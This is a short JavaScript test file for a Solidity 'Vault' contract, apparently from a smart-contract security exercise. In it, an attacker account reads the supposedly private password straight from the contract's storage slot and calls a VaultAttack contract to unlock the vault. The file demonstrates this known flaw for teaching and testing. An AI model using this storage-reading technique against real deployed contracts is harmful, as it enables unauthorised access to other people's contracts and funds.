// test/Vault.test.js

// load dependencies
const { expect } = require('chai');

// import utils from test helpers
const { BN, expectEvent, expectRevert } = require('@openzeppelin/test-helpers');

// load compiled artifacts
const Vault = artifacts.require('Vault');
const VaultAttack = artifacts.require('VaultAttack');

// start test block
contract('Vault', function ([ owner, other ]) {

  beforeEach(async function () {
    const pwd = ethers.utils.formatBytes32String('password');
    this.vault = await Vault.new(pwd, { from: owner });
    this.vaultAttack = await VaultAttack.new(this.vault.address, {from: other});
    // check initial contract is locked
    expect(await this.vault.locked()).to.be.true;
  });

  it('test attack: use ethers-js to read password from storage slot to unlock vault', async function () {
    const extractedPass = await ethers.provider.getStorageAt(this.vault.address, 1);
    await this.vaultAttack.attack(extractedPass, {from: other});
    // check contract is now unlocked
    expect(await this.vault.locked()).to.be.false;
  });
});
